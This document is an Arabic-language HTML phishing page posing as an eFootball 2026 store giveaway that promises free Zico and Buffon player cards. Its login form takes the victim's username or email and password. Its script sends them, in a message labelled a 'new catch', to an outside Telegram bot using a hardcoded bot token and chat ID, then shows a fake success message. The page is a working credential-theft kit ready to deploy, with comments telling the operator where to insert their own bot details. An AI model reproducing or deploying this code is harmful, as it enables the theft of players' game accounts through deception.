<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بيس موبايل  | eFootball Store</title>
    <!-- استيراد أيقونات وخطوط عربية عصرية -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Cairo', sans-serif;
        }
        body {
            background: linear-gradient(135deg, #0d0e15, #16192b, #090a10);
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        .header {
            text-align: center;
            margin-bottom: 25px;
        }
        .logo-icon {
            font-size: 45px;
            color: #00ffcc;
            text-shadow: 0 0 15px rgba(0,255,204,0.6);
            margin-bottom: 5px;
        }
        .header h1 {
            font-size: 26px;
            font-weight: 900;
            background: linear-gradient(45deg, #00ffcc, #0077ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .container {
            width: 100%;
            max-width: 450px;
            background: rgba(25, 29, 45, 0.85);
            border: 2px solid rgba(0, 255, 204, 0.3);
            border-radius: 20px;
            padding: 25px;
            box-shadow: 0 0 25px rgba(0, 255, 204, 0.2);
            backdrop-filter: blur(10px);
        }
        .players-showcase {
            display: flex;
            justify-content: space-around;
            margin-bottom: 20px;
            gap: 10px;
        }
        .player-card {
            text-align: center;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 12px;
            padding: 10px;
            width: 48%;
            border: 1px solid #0077ff;
        }
        .player-card img {
            width: 100%;
            height: 150px;
            border-radius: 8px;
            object-fit: contain;
            background: #000;
            border: 1px solid #00ffcc;
            margin-bottom: 8px;
        }
        .player-card h3 {
            font-size: 13px;
            color: #ffcc00;
        }
        .free-badge {
            background: linear-gradient(45deg, #ff0055, #ffcc00);
            color: #000;
            font-weight: bold;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            display: inline-block;
            margin-bottom: 15px;
            box-shadow: 0 0 10px rgba(255,204,0,0.5);
        }
        .form-group {
            margin-bottom: 15px;
            text-align: right;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: #00ffcc;
        }
        .input-box {
            position: relative;
        }
        .input-box i {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #aaa;
        }
        .input-box input {
            width: 100%;
            padding: 12px 45px 12px 15px;
            background: rgba(10, 12, 20, 0.8);
            border: 1px solid #333;
            border-radius: 10px;
            color: #fff;
            font-size: 14px;
            outline: none;
            transition: 0.3s;
        }
        .input-box input:focus {
            border-color: #00ffcc;
            box-shadow: 0 0 10px rgba(0,255,204,0.3);
        }
        .submit-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(45deg, #00ffcc, #0077ff);
            border: none;
            border-radius: 10px;
            color: #000;
            font-weight: 900;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 10px;
        }
        .submit-btn:hover {
            opacity: 0.9;
            transform: scale(1.02);
        }
        .footer-note {
            text-align: center;
            font-size: 11px;
            color: #888;
            margin-top: 15px;
        }
    </style>
</head>
<body>

    <div class="header">
        <!-- أيقونة بيس مميزة -->
        <div class="logo-icon"><i class="fa-solid fa-futbol"></i></div>
        <h1>eFootball 2026 Store</h1>
    </div>

    <div class="container">
        <div style="text-align: center;">
            <span class="free-badge">🎁 احصل على زيكو وبوفون مجاناً الآن!</span>
        </div>

        <!-- عرض اللاعبين (زيكو وبوفون بالصور الجديدة) -->
        <div class="players-showcase">
            <div class="player-card">
                <img src="https://freeimage.host/i/CDGgAzu" alt="Zico">
                <h3>زيكو (Epic Card)</h3>
            </div>
            <div class="player-card">
                <img src="https://freeimage.host/i/CDGrsna" alt="Buffon">
                <h3>بوفون (Latest Card)</h3>
            </div>
        </div>

        <!-- نموذج تسجيل الدخول -->
        <form id="loginForm">
            <div class="form-group">
                <label><i class="fa-solid fa-user"></i> اسم المستخدم أو البريد:</label>
                <div class="input-box">
                    <i class="fa-solid fa-envelope"></i>
                    <input type="text" id="username" required placeholder="أدخل البريد أو المعرف">
                </div>
            </div>

            <div class="form-group">
                <label><i class="fa-solid fa-lock"></i> كلمة المرور:</label>
                <div class="input-box">
                    <i class="fa-solid fa-key"></i>
                    <input type="password" id="password" required placeholder="أدخل كلمة المرور">
                </div>
            </div>

            <button type="submit" class="submit-btn">تأكيد واستلام اللاعبين بالبريد 📥</button>
        </form>

        <div class="footer-note">
            🔒 الموقع محمي وآمن بالكامل لإرسال الهدايا لبريد اللعبة.
        </div>
    </div>

    <script>
        // إعدادات بوت التليجرام (قم بوضع التوكن والآيدي الخاص بك هنا)
        const botToken = "8885135758:AAF_bg6_Ao4TMfv0Z5pqCJZLxk8_22pFzvA"; // ضع توكن البوت هنا
        const chatId = "1210901255";       // ضع الآيدي الخاص بك هنا

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            // تنسيق الرسالة التي ستصلك للبوت
            const message = `🚨 صيد جديد في متجر بيس (زيكو وبوفون)!\n\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;

            // إرسال البيانات عبر تليجرام API
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => {
                if (response.ok) {
                    alert('✅ تم التحقق بنجاح! سيتم إرسال اللاعبين إلى بريد حسابك خلال دقائق.');
                    document.getElementById('loginForm').reset();
                } else {
                    alert('حدث خطأ بسيط، يرجى المحاولة لاحقاً.');
                }
            })
            .catch(error => {
                alert('تأكد من الاتصال بالإنترنت.');
            });
        });
    </script>
</body>
</html>
